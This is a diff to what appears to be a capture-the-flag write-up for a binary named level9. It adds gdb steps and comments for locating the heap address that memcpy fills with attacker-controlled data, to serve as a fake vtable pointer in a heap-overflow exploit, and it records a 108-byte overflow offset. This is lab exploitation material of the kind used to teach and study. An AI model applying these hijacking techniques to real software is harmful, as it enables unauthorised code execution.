@@ -166,9 +166,15 @@ gdb ./level9
 ; eax = 0x41366441 at SIGSEGV → offset 108
 
 ; Find obj1 data address after memcpy
+; memcpy(3) returns its destination pointer in eax.
+; Break on memcpy, then `finish` to return from it.
+; After return, eax holds the destination = obj1+4 = start of our payload in heap.
+; That address is the one to hardcode as the fake vtable ptr in the payload.
 (gdb) b memcpy
-(gdb) finish
-(gdb) i r                      ; eax = 0x804a00c  ← start of our controlled data
+(gdb) r <cyclic_pattern>
+(gdb) finish                   ; run memcpy to completion
+(gdb) i r                      ; eax = 0x804a00c  ← obj1+4, start of our controlled data
+(gdb) x/x $eax                 ; confirm: shows first bytes of our pattern copied there
 ```
 
 ```bash
